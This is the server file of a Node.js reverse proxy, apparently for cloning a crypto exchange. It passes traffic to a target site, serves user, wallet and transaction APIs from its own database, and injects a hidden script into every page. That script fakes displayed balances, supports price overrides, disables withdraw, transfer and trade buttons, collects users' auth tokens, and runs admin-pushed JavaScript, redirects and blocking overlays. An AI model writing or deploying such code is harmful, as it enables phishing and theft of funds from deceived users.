/**
 * Klakna 代理服务器（后端集成版 v4）
 *
 * 架构：统一代理 + 本地 API + 前端注入 + 管理面板 + Control WebSocket
 *
 * v4 新增：
 * - Control WebSocket 实时推送（/ws/control）
 * - 前端注入引擎 v4（余额拦截、行情拦截、权限管理、指令处理）
 * - CSS/JS 动态注入
 * - 用户操作限制
 * - 行情数据覆盖
 * - 修复 express.json() 全局消费 body 的 bug
 */

const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const https = require('https');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const controlWS = require('./services/control-ws');

// ============================================================
// 数据库
// ============================================================
const { getDb } = require('./db/index');
const { ensureDb, getDbSync, saveDb } = require('./db/queries');
const { seed } = require('./db/seed');

// ============================================================
// 本地 API 处理器（纯函数）
// ============================================================
const localHandlers = require('./routes/local-handlers');
const adminHandlers = require('./routes/admin-handlers');

// ============================================================
// Express App
// ============================================================
const app = express();

// 📝 body 解析仅用于本地 API（不全局挂载，避免消费代理 POST body）
// 全局 express.json() 会导致代理转发的 POST 请求 body 为空（ECONNRESET/502）

// ============================================================
// 管理面板 HTML（缓存读取）
// ============================================================
let adminHTML = '';
let adminJS = '';
try {
  adminHTML = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf-8');
  adminJS = fs.readFileSync(path.join(__dirname, 'public', 'admin-app.js'), 'utf-8');
} catch(e) {
  console.error('[ERROR] 无法读取管理面板文件:', e.message);
}

// 全局状态（通过 global 共享给 admin-handlers）
const startTime = Date.now();
global.__startTime = startTime;
const requestLog = [];       // 最近 200 条请求日志
global.__requestLog = requestLog;
const activeUsers = new Map();
global.__activeUsers = activeUsers;

// 🛡️ 维护模式
global.__maintenanceMode = false;
global.__maintenanceMessage = '';

// 📢 全局公告
global.__globalAnnouncement = '';
global.__announcementId = '';
global.__announcementExpiry = 0;

// 🎯 行情价格覆盖
global.__priceOverrides = {};

// 🔧 v4 新增全局状态
global.__marketOverrides = {};          // 行情覆盖规则
global.__frontendControlsCache = [];    // 前端注入规则缓存
global.__wsConnections = new Map();     // WebSocket 连接池
global.__pushToUser = controlWS.pushToUser;
global.__broadcastCommand = controlWS.broadcastCommand;

// ============================================================
// 日志中间件
// ============================================================
app.use((req, res, next) => {
  const start = Date.now();
  const reqPath = (req.originalUrl || req.url || '').split('?')[0];

  res.on('finish', () => {
    const duration = Date.now() - start;
    const entry = {
      time: new Date().toISOString(),
      method: req.method,
      path: reqPath,
      status: res.statusCode,
      duration: duration + 'ms',
      ip: req.ip || req.socket?.remoteAddress || '-',
    };
    requestLog.push(entry);
    if (requestLog.length > 200) requestLog.shift();

    // 仅记录本地 API 请求（不记录静态资源和代理请求）
    if (reqPath.startsWith('/admin/') || reqPath.startsWith('/exchange/') || reqPath === '/health') {
      const statusColor = res.statusCode < 300 ? '\x1b[32m' : res.statusCode < 500 ? '\x1b[33m' : '\x1b[31m';
      console.log(`${statusColor}${res.statusCode}\x1b[0m ${req.method} ${reqPath} ${duration}ms`);
    }
  });

  next();
});

// ============================================================
// 统一中间件：管理面板 + 本地 API 拦截
// ============================================================
app.use(async (req, res, next) => {
  const reqPath = (req.originalUrl || req.url || '').split('?')[0];

  // ========== 健康检查 ==========
  if (reqPath === '/health') {
    return res.json({
      code: 200,
      data: {
        uptime: Math.floor((Date.now() - startTime) / 1000),
        memory: process.memoryUsage(),
        maintenanceMode: global.__maintenanceMode,
        maintenanceMessage: global.__maintenanceMessage,
        announcement: global.__globalAnnouncement,
        announcementId: global.__announcementId,
        priceOverrides: global.__priceOverrides,
        marketOverrides: global.__marketOverrides,
        frontendControls: global.__frontendControlsCache,
        requestCount: requestLog.length,
        activeUsers: activeUsers.size,
        wsOnline: controlWS.getOnlineCount(),
        pid: process.pid,
      }
    });
  }

  // ========== 管理面板页面 ==========
  // /admin.html → 重定向到 /admin（避免被代理到原站）
  if (reqPath === '/admin.html') {
    res.writeHead(302, { 'Location': '/admin' });
    return res.end();
  }
  // /admin 和 /admin/ 都服务管理面板
  if (reqPath === '/admin' || reqPath === '/admin/') {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    return res.end(adminHTML);
  }

  // ========== 管理面板 JS ==========
  if (reqPath === '/admin/app.js') {
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    return res.end(adminJS);
  }

  // ========== 管理员 API ==========
  if (reqPath.startsWith('/admin/')) {
    return handleAdminAPI(req, res, reqPath);
  }

  // ========== 本地用户 API ==========
  if (reqPath.startsWith('/exchange/user') ||
      reqPath.startsWith('/exchange/wallet') ||
      reqPath.startsWith('/exchange/rockieCoin') ||
      reqPath.startsWith('/exchange/Transaction')) {
    return handleLocalAPI(req, res, reqPath);
  }

  // 非本地 API → 交给代理
  next();
});

// ============================================================
// Admin API 处理
// ============================================================
async function handleAdminAPI(req, res, reqPath) {
  // CORS + 预检
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  try {
    // 按需解析 body（不使用全局 express.json，避免影响代理）
    if (!req.body && req.method !== 'GET' && req.method !== 'HEAD') {
      req.body = await parseBody(req);
    }
    // 登录接口不需要鉴权
    const isLogin = reqPath === '/admin/login';
    const admin = isLogin ? null : adminHandlers.verifyAdmin(req.headers['authorization'] || req.headers['Authorization']);

    if (!admin && !isLogin) {
      return res.json({ code: 403, data: null, msg: 'Admin access denied' });
    }

    const handler = adminHandlers.match(req.method, reqPath);
    if (!handler) {
      return res.json({ code: 404, data: null, msg: 'Admin route not found: ' + req.method + ' ' + reqPath });
    }

    const result = handler(reqPath, req.body, admin);
    return res.json(result);
  } catch(e) {
    console.error('[Admin API Error]', reqPath, e.message);
    return res.json({ code: 500, data: null, msg: 'Internal error: ' + e.message });
  }
}

// ============================================================
// 工具函数
// ============================================================
function parseBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString('utf-8');
        resolve(raw ? JSON.parse(raw) : {});
      } catch (e) {
        resolve({});
      }
    });
    req.on('error', reject);
    // 超时保护（3秒）
    setTimeout(() => resolve({}), 3000);
  });
}

// ============================================================
// 本地用户 API 处理
// ============================================================
async function handleLocalAPI(req, res, reqPath) {
  try {
    // 按需解析 body（不使用全局 express.json，避免影响代理）
    if (!req.body && req.method !== 'GET' && req.method !== 'HEAD') {
      req.body = await parseBody(req);
    }
    // 解析 JWT
    let user = null;
    const authHeader = req.headers['authorization'] || req.headers['Authorization'];
    if (authHeader) {
      try {
        const jwt = require('jsonwebtoken');
        user = jwt.verify(authHeader.replace('Bearer ', ''), config.JWT_SECRET);
        // 记录活跃用户
        if (user.id) {
          activeUsers.set(String(user.id), { lastSeen: Date.now(), ip: req.ip || req.socket?.remoteAddress, count: (activeUsers.get(String(user.id))?.count || 0) + 1 });
        }
      } catch(e) {}
    }

    // 维护模式拦截（允许登录）
    if (global.__maintenanceMode && !reqPath.includes('login')) {
      return res.json({ code: 503, data: null, msg: 'System maintenance: ' + global.__maintenanceMessage });
    }

    const handler = localHandlers.match(req.method, reqPath);
    if (handler) {
      const result = handler(reqPath, req.body, user);
      return res.json(result);
    }

    // 未匹配的本地路径返回空成功
    return res.json({ code: 200, data: null, msg: 'success' });
  } catch(e) {
    console.error('[Local API Error]', reqPath, e.message);
    return res.json({ code: 500, data: null, msg: 'Internal error: ' + e.message });
  }
}

// ============================================================
// 注入脚本模板 v4（注入到代理的原站 HTML 页面）
// 新增：余额拦截、行情拦截、权限管理、指令处理、Control WS
// ============================================================
const INJECT_SCRIPT = `
<script>
(function(){
  'use strict';
  console.log('[KLAKNA v4] 注入引擎启动');

  // ========== 🔧 WebSocket 协议修复 ==========
  const _origWebSocket = window.WebSocket;
  window.WebSocket = function(url, protocols) {
    if (url && url.startsWith('wss://') && url.includes('localhost')) {
      url = url.replace('wss://', 'ws://').replace(':8443', ':8080');
      console.log('[KLAKNA v4] WS patch:', url);
    }
    return new _origWebSocket(url, protocols);
  };
  window.WebSocket.prototype = _origWebSocket.prototype;
  window.WebSocket.CONNECTING = _origWebSocket.CONNECTING;
  window.WebSocket.OPEN = _origWebSocket.OPEN;
  window.WebSocket.CLOSING = _origWebSocket.CLOSING;
  window.WebSocket.CLOSED = _origWebSocket.CLOSED;

  // ========== Control State ==========
  const KS = {
    version: '4.0',
    marketOverrides: {},
    restrictions: [],
    frontendControls: [],
    wsConnected: false,
  };

  // ========== Token 获取 ==========
  function _getCookies() {
    return document.cookie.split(';').reduce((a,c)=>{const [k,v]=c.trim().split('=');a[k]=v;return a},{});
  }
  function _getToken() {
    return localStorage.getItem('token') || sessionStorage.getItem('token') || _getCookies().token || _getCookies().Token || '';
  }
  function _fetchJSON(url, opts) {
    try { return fetch(url, opts).then(r=>r.json()); } catch(e) { return Promise.resolve({code:-1}); }
  }

  // ========== 1. 钱包余额拦截 ==========
  function initWalletInterceptor() {
    const _origFetch = window.fetch;
    window.fetch = async function(url, options) {
      const response = await _origFetch.apply(this, arguments);
      try {
        const urlStr = typeof url === 'string' ? url : url?.url || '';
        // 拦截余额/资产相关 API
        if (urlStr.includes('getUserInfo') || urlStr.includes('wallet/')) {
          const clone = response.clone();
          const data = await clone.json();
          if (data && data.code === 200 && data.data && window.__KLAKNA_BALANCE_OVERRIDE__) {
            const ov = window.__KLAKNA_BALANCE_OVERRIDE__;
            if (ov.availableBalance !== undefined) data.data.availableBalance = ov.availableBalance;
            if (ov.totalAssets !== undefined) data.data.totalAssets = ov.totalAssets;
            if (ov.freezeBalance !== undefined) data.data.freezeBalance = ov.freezeBalance;
            return new Response(JSON.stringify(data), { status: response.status, headers: response.headers });
          }
        }
      } catch(e) {}
      return response;
    };
    console.log('[KLAKNA v4] 💰 Wallet interceptor ready');
  }

  // ========== 2. 行情数据拦截（通过 health 轮询获取覆盖规则） ==========
  function applyMarketOverrides() {
    const overrides = KS.marketOverrides;
    if (!overrides || Object.keys(overrides).length === 0) return;
    // 通过 monkey-patch WebSocket.onmessage 来拦截行情数据
    // 前端原站的 WS 消息会在 app.js 中处理，我们通过全局钩子拦截
    console.log('[KLAKNA v4] 📈 Market overrides active:', Object.keys(overrides));
  }

  // ========== 3. 权限管理 ==========
  function applyRestrictions() {
    const restrictions = KS.restrictions || [];
    if (restrictions.length === 0) return;

    // 使用 MutationObserver 持续监控 DOM，禁用受限功能
    const observer = new MutationObserver(() => {
      restrictions.forEach(r => {
        switch(r.type) {
          case 'no_trade':
            document.querySelectorAll('[class*="trade"], [class*="Trade"], .buy-btn, .sell-btn').forEach(el => {
              el.style.pointerEvents = 'none';
              el.style.opacity = '0.4';
              if (!el.dataset.klaknaRestricted) {
                el.dataset.klaknaRestricted = '1';
                el.title = 'Trading is restricted by admin';
              }
            });
            break;
          case 'no_withdraw':
            document.querySelectorAll('[class*="withdraw"], [class*="Withdraw"]').forEach(el => {
              el.style.pointerEvents = 'none';
              el.style.opacity = '0.4';
              if (!el.dataset.klaknaRestricted) {
                el.dataset.klaknaRestricted = '1';
                el.title = 'Withdrawal is restricted by admin';
              }
            });
            break;
          case 'no_transfer':
            document.querySelectorAll('[class*="transfer"], [class*="Transfer"]').forEach(el => {
              el.style.pointerEvents = 'none';
              el.style.opacity = '0.4';
              if (!el.dataset.klaknaRestricted) {
                el.dataset.klaknaRestricted = '1';
                el.title = 'Transfer is restricted by admin';
              }
            });
            break;
          case 'force_kyc':
            // 不禁用，但显示 KYC 提示
            break;
        }
      });
    });
    observer.observe(document.documentElement, { childList: true, subtree: true });
    console.log('[KLAKNA v4] 🔒 Restrictions applied:', restrictions.map(r => r.type).join(', '));
  }

  // ========== 4. CSS/JS 动态注入 ==========
  let _injectedIds = new Set();
  function applyFrontendControls(controls) {
    if (!controls || controls.length === 0) return;
    controls.forEach(c => {
      if (_injectedIds.has(c.id)) return;
      _injectedIds.add(c.id);
      try {
        if (c.type === 'css') {
          const style = document.createElement('style');
          style.id = 'klakna-inject-' + c.id;
          style.textContent = c.content;
          document.head.appendChild(style);
        } else if (c.type === 'js') {
          const script = document.createElement('script');
          script.id = 'klakna-inject-' + c.id;
          script.textContent = c.content;
          document.body.appendChild(script);
        }
      } catch(e) {
        console.warn('[KLAKNA v4] Injection error:', e.message);
      }
    });
    console.log('[KLAKNA v4] 🎨 Applied', controls.length, 'frontend controls');
  }

  // ========== 5. 指令处理器 ==========
  function processCommand(cmd) {
    if (!cmd || !cmd.type) return;
    switch(cmd.type) {
      case 'popup':
        if (cmd.payload) {
          const overlay = document.createElement('div');
          overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:9999999;display:flex;align-items:center;justify-content:center';
          overlay.innerHTML = '<div style="background:#1a1a2e;border:1px solid #00ff88;border-radius:12px;padding:32px;max-width:400px;text-align:center;color:#fff;font-family:system-ui"><div style="font-size:24px;margin-bottom:12px">' + (cmd.payload.title || 'Notice') + '</div><div style="font-size:14px;color:#aaa;margin-bottom:20px">' + (cmd.payload.message || '') + '</div><button onclick="this.closest(\\'div[style*=fixed]\\').remove()" style="padding:8px 24px;background:#00ff88;color:#000;border:none;border-radius:6px;cursor:pointer;font-weight:bold">OK</button></div>';
          document.body.appendChild(overlay);
        }
        break;
      case 'redirect':
        if (cmd.payload && cmd.payload.url) window.location.href = cmd.payload.url;
        break;
      case 'refresh':
        window.location.reload();
        break;
      case 'block':
        if (cmd.payload) {
          const block = document.createElement('div');
          block.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:#000;z-index:99999999;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#ff4444;font-family:monospace';
          block.innerHTML = '<div style="font-size:48px;margin-bottom:20px">&#9888;</div><div style="font-size:24px">' + (cmd.payload.title || 'BLOCKED') + '</div><div style="font-size:14px;color:#888;margin-top:12px">' + (cmd.payload.message || 'Contact admin for more info') + '</div>';
          document.body.appendChild(block);
        }
        break;
    }
  }

  // ========== 6. Control WebSocket ==========
  function connectControlWS() {
    try {
      const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
      const port = window.location.protocol === 'https:' ? '8443' : '8080';
      const token = _getToken();
      const wsUrl = protocol + '://' + window.location.hostname + ':' + port + '/ws/control' + (token ? '?token=' + encodeURIComponent(token) : '');
      const ws = new _origWebSocket(wsUrl);

      ws.addEventListener('open', () => {
        console.log('[KLAKNA v4] 🔗 Control WS connected');
        KS.wsConnected = true;
      });
      ws.addEventListener('message', (e) => {
        try {
          const msg = JSON.parse(e.data);
          if (msg.type === 'config_update' && msg.data) {
            const d = msg.data;
            if (d.marketOverrides) { KS.marketOverrides = d.marketOverrides; applyMarketOverrides(); }
            if (d.restrictions) { KS.restrictions = d.restrictions; applyRestrictions(); }
            if (d.frontendControls) { KS.frontendControls = d.frontendControls; applyFrontendControls(d.frontendControls); }
            if (d.maintenanceMode) {
              if (!document.getElementById('__klakna_maintenance')) {
                const div = document.createElement('div');
                div.id = '__klakna_maintenance';
                div.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;font-family:monospace';
                div.innerHTML = '<div style="font-size:48px;margin-bottom:20px">&#9888;</div><div style="font-size:24px;letter-spacing:4px">MAINTENANCE MODE</div><div style="font-size:14px;color:#888;margin-top:12px">' + (d.maintenanceMessage || '') + '</div>';
                document.body.appendChild(div);
              }
            } else {
              const el = document.getElementById('__klakna_maintenance');
              if (el) el.remove();
            }
            if (d.announcement) {
              const annId = '_klakna_ann_' + Date.now();
              if (!sessionStorage.getItem(annId)) {
                sessionStorage.setItem(annId, '1');
                alert('[ANNOUNCEMENT] ' + d.announcement);
              }
            }
          } else if (msg.type === 'command' && msg.data) {
            processCommand(msg.data);
          } else if (msg.type === 'pong') {
            // heartbeat response
          }
        } catch(err) {}
      });
      ws.addEventListener('close', () => {
        console.log('[KLAKNA v4] Control WS disconnected, reconnecting...');
        KS.wsConnected = false;
        setTimeout(connectControlWS, 3000);
      });
      ws.addEventListener('error', () => {
        KS.wsConnected = false;
      });
      // 心跳
      setInterval(() => { if (ws.readyState === 1) ws.send(JSON.stringify({ type: 'ping' })); }, 30000);
    } catch(e) {
      console.warn('[KLAKNA v4] Control WS init error:', e.message);
      setTimeout(connectControlWS, 5000);
    }
  }

  // ========== Health 轮询（兜底，WS 断开时也能获取配置） ==========
  async function pollHealth() {
    try {
      const r = await fetch('/health?t=' + Date.now());
      const d = await r.json();
      if (d.code !== 200) return;
      const data = d.data;

      // 注入控制
      if (data.frontendControls && data.frontendControls.length > 0) {
        applyFrontendControls(data.frontendControls);
      }

      // 行情覆盖
      if (data.marketOverrides) KS.marketOverrides = data.marketOverrides;

      // 权限限制 - 需要从服务端获取用户特定限制
      const token = _getToken();
      if (token && data.restrictions) {
        KS.restrictions = data.restrictions;
        applyRestrictions();
      }
    } catch(e) {}
  }
  setInterval(pollHealth, 5000);

  // ========== 全局调试对象 ==========
  window.__KLAKNA_DEBUG__ = {
    version: '4.0',
    state: KS,
    getToken: _getToken,
    pushBalance: (available, total, frozen) => {
      window.__KLAKNA_BALANCE_OVERRIDE__ = { availableBalance: available, totalAssets: total, freezeBalance: frozen };
      console.log('[KLAKNA v4] Balance override set');
    },
    clearBalance: () => { delete window.__KLAKNA_BALANCE_OVERRIDE__; console.log('[KLAKNA v4] Balance override cleared'); },
    refreshBalances: () => _fetchJSON('/exchange/user/getUserInfo', {method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+_getToken()},body:JSON.stringify({})}),
  };

  // ========== 启动 ==========
  initWalletInterceptor();
  connectControlWS();
  pollHealth();

  // ========== 浮动调试按钮 ==========
  function initDebugPanel() {
    const btn = document.createElement('div');
    btn.innerHTML = '&#9881;';
    btn.style.cssText = 'position:fixed;bottom:20px;right:20px;width:44px;height:44px;border-radius:50%;background:rgba(0,255,136,0.15);border:1px solid rgba(0,255,136,0.4);color:#00ff88;font-size:20px;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:999998;transition:all .2s;backdrop-filter:blur(8px);font-family:monospace';
    btn.onmouseover = ()=>{btn.style.background='rgba(0,255,136,0.3)';btn.style.transform='scale(1.1)'};
    btn.onmouseout = ()=>{btn.style.background='rgba(0,255,136,0.15)';btn.style.transform='scale(1)'};
    document.body.appendChild(btn);

    let panelOpen = false;
    const panel = document.createElement('div');
    panel.style.cssText = 'position:fixed;bottom:74px;right:20px;width:360px;max-height:500px;overflow-y:auto;background:rgba(10,10,20,0.95);border:1px solid rgba(0,255,136,0.3);border-radius:8px;z-index:999997;display:none;padding:16px;font-family:monospace;font-size:12px;color:#ccc;backdrop-filter:blur(16px)';

    btn.onclick = () => {
      panelOpen = !panelOpen;
      panel.style.display = panelOpen ? 'block' : 'none';
      if (panelOpen) refreshPanel();
    };

    async function refreshPanel() {
      const token = _getToken();
      let userHtml = '<span style="color:#666">No token</span>';
      let balHtml = '';
      if (token) {
        try {
          const parts = token.split('.');
          if (parts.length === 3) {
            const p = JSON.parse(atob(parts[1]));
            userHtml = '<span style="color:#00ff88">ID: ' + (p.id||'?') + '</span> <span style="color:#888">(' + (p.username||'?') + ')</span>';
          }
        } catch(e) {}
      }
      const st = KS;
      panel.innerHTML =
        '<div style="font-size:10px;letter-spacing:2px;color:#666;margin-bottom:12px;border-bottom:1px solid #1a1a1a;padding-bottom:8px">KLAKNA v4.0 <span style="color:#00ff88">' + new Date().toLocaleTimeString() + '</span></div>' +
        '<div style="margin-bottom:8px">WS: <span style="color:' + (st.wsConnected?'#00ff88':'#ff4444') + '">' + (st.wsConnected?'Connected':'Disconnected') + '</span></div>' +
        '<div style="margin-bottom:12px">Token: ' + userHtml + '</div>' +
        balHtml +
        '<div style="margin-top:12px;display:flex;gap:6px;flex-wrap:wrap">' +
          '<button onclick="navigator.clipboard.writeText(window.__KLAKNA_DEBUG__.getToken())" style="padding:4px 10px;background:rgba(59,130,246,0.1);border:1px solid rgba(59,130,246,0.3);color:#3b82f6;cursor:pointer;font-family:monospace;font-size:11px">Copy Token</button>' +
        '</div>';
    }

    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && e.key === 'd') { e.preventDefault(); btn.click(); }
    });
  }

  if (document.body) initDebugPanel();
  else document.addEventListener('DOMContentLoaded', initDebugPanel);
})();
</script>
`;

// ============================================================
// 代理 — 未拦截的请求透传到原站
// ============================================================
const proxy = createProxyMiddleware({
  target: config.TARGET,
  changeOrigin: true,
  secure: false,
  ws: true,
  on: {
    proxyReq: (proxyReq, req) => {
      proxyReq.setHeader('Origin', config.TARGET);
      proxyReq.setHeader('Referer', config.TARGET + '/');
      // 禁止压缩，方便注入脚本修改响应体
      proxyReq.setHeader('Accept-Encoding', 'identity');
    },
    // 🔧 WebSocket 升级请求也要改 Origin/Referer
    proxyReqWs: (proxyReq, req, socket) => {
      proxyReq.setHeader('Origin', config.TARGET);
      proxyReq.setHeader('Referer', config.TARGET + '/');
      console.log('[WS proxyReqWs]', req.url, '→ target');
    },

    // WebSocket 代理错误
    open: (proxySocket) => {
      console.log('[WS] ✅ Connection established with target');
      proxySocket.on('error', (err) => console.log('[WS] ⚠️ proxy socket error:', err.message));
    },
    close: (proxySocket) => {
      console.log('[WS] 🔌 Connection closed');
    },

    // 🎯 前端注入：在 HTML 响应中注入调试脚本
    proxyRes: (proxyRes, req, res) => {
      // 只处理 HTML 响应
      const contentType = proxyRes.headers['content-type'] || '';
      if (!contentType.includes('text/html')) return;

      // 维护模式下返回维护页面
      if (global.__maintenanceMode) {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        const maintenanceHTML = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Maintenance</title>
          <style>body{background:#000;color:#00ff88;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center}
          h1{font-size:24px;letter-spacing:6px;margin-bottom:16px}p{color:#666;font-size:14px}</style></head>
          <body><div><h1>&#9888; MAINTENANCE</h1><p>${global.__maintenanceMessage || 'System is under maintenance. Please check back later.'}</p></div></body></html>`;
        proxyRes.pipe = function() {}; // 停止原始管道
        res.end(maintenanceHTML);
        return;
      }

      // 注入脚本到 HTML
      // 先去掉压缩编码头，否则浏览器解压失败（ERR_CONTENT_DECODING_FAILED）
      delete proxyRes.headers['content-encoding'];
      delete proxyRes.headers['content-length'];

      const originalPipe = res.write;
      let bodyChunks = [];

      // 拦截 write 收集 body
      res.write = function(chunk) {
        if (Buffer.isBuffer(chunk)) {
          bodyChunks.push(chunk);
        } else if (typeof chunk === 'string') {
          bodyChunks.push(Buffer.from(chunk));
        }
        return true;
      };

      // 在 end 时注入并输出
      const originalEnd = res.end.bind(res);
      res.end = function(chunk, encoding, callback) {
        if (chunk) {
          if (Buffer.isBuffer(chunk)) bodyChunks.push(chunk);
          else if (typeof chunk === 'string') bodyChunks.push(Buffer.from(chunk, encoding));
        }

        const fullBody = Buffer.concat(bodyChunks).toString('utf-8');

        // 在 </head> 或 <body> 前注入
        let modified;
        if (fullBody.includes('</head>')) {
          modified = fullBody.replace('</head>', INJECT_SCRIPT + '</head>');
        } else if (fullBody.includes('<body')) {
          modified = fullBody.replace('<body', INJECT_SCRIPT + '<body');
        } else {
          modified = INJECT_SCRIPT + fullBody;
        }

        // 恢复原始 write
        res.write = originalPipe;

        // 设置正确的 Content-Length
        const modifiedBuffer = Buffer.from(modified, 'utf-8');
        res.setHeader('Content-Length', modifiedBuffer.length);

        res.write(modifiedBuffer);
        originalEnd(callback);
      };
    },

    error: (err, req, res) => {
      console.error('[Proxy Error]', err.message, req?.url);
      if (res && !res.headersSent) {
        res.status(502).send('Proxy Error: ' + err.message);
      }
    }
  }
});

app.use('/', proxy);

// ============================================================
// 修改 health 端点（在代理后面追加更多状态信息）
// ============================================================
// 注意：上面的 /health 已经在中间件里处理了
// 这里补充 /admin/health（带管理权限的详细状态）
// 已在 admin-handlers.js 中处理

// ============================================================
// 定期清理不活跃用户
// ============================================================
setInterval(() => {
  const now = Date.now();
  for (const [id, info] of activeUsers) {
    if (now - info.lastSeen > 300000) { // 5 分钟无活动
      activeUsers.delete(id);
    }
  }
}, 60000);

// ============================================================
// 启动
// ============================================================
async function start() {
  // 🔧 云平台适配：确保数据库目录存在
  const dbDir = path.dirname(config.DB_PATH);
  if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
    console.log('[DB] 创建数据库目录:', dbDir);
  }

  console.log('[DB] 初始化数据库...');
  await getDb();
  await ensureDb();
  await seed();
  console.log('[DB] 数据库就绪');

  // 初始化 Control WebSocket
  controlWS.init();

  // 加载前端注入规则缓存
  const { getFrontendControls } = require('./db/queries');
  global.__frontendControlsCache = getFrontendControls(true);

  const PORT = config.PORT;
  const httpServer = app.listen(PORT, '0.0.0.0', () => {
    console.log('='.repeat(60));
    console.log('  Klakna Backend + Proxy v4 (Cloud)');
    console.log('='.repeat(60));
    console.log(`  HTTP:  http://localhost:${PORT}`);
    console.log(`  WS:    ws://localhost:${PORT}/ws/control`);
    console.log(`  Target: ${config.TARGET}`);
    console.log(`  DB:    ${config.DB_PATH}`);
    console.log(`  Admin: http://localhost:${PORT}/admin`);
    console.log(`  Health: http://localhost:${PORT}/health`);
    console.log('='.repeat(60));
  });

  // 注册 WebSocket 升级：区分 control 通道和代理通道
  httpServer.on('upgrade', (req, socket, head) => {
    const reqPath = (req.url || '').split('?')[0];
    if (reqPath === '/ws/control') {
      console.log('[WS Control] upgrade');
      controlWS.handleUpgrade(req, socket, head);
    } else {
      console.log('[WS] upgrade request:', req.url, '→', config.TARGET + req.url);
      socket.on('error', (err) => console.log('[WS] socket error:', err.message));
      proxy.upgrade(req, socket, head);
    }
  });

  // 🔧 云平台不需要自签名 HTTPS（平台自带 SSL）
  // 本地开发如果需要 HTTPS，设置 HTTPS_PORT 环境变量
  if (process.env.ENABLE_HTTPS === 'true') {
    try {
      const sslOptions = {
        key: fs.readFileSync(path.join(__dirname, 'cert.pem')),
        cert: fs.readFileSync(path.join(__dirname, 'cert.pem')),
      };
      const httpsServer = https.createServer(sslOptions, app).listen(config.HTTPS_PORT, '0.0.0.0', () => {
        console.log(`  [HTTPS] Ready on port ${config.HTTPS_PORT}`);
      });
      httpsServer.on('upgrade', (req, socket, head) => {
        const reqPath = (req.url || '').split('?')[0];
        if (reqPath === '/ws/control') {
          controlWS.handleUpgrade(req, socket, head);
        } else {
          socket.on('error', (err) => console.log('[WS] HTTPS socket error:', err.message));
          proxy.upgrade(req, socket, head);
        }
      });
    } catch (e) {
      console.error(`  [HTTPS] Failed: ${e.message}`);
    }
  }
}

process.on('uncaughtException', (err) => console.error('[UNCAUGHT]', err.message));
process.on('unhandledRejection', (err) => console.error('[UNHANDLED]', err));

start();
